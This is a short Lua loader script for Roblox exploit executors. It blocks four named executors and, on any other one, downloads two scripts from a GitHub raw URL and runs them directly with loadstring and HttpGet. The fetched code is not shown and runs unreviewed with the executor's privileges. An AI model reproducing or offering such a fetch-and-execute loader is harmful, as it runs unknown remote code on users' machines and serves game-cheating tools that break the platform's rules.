local function isBlockedExecutor()
    local executer = identifyexecutor()
    if executer == "Solara" or executer == "JJSploit" or executer == "Xeno" or executer == "Zorara" then
        return true
    end
    return false
end

if not isBlockedExecutor() then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Theyfwdan/12/refs/heads/main/1214"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Theyfwdan/12/refs/heads/main/sa"))()
end

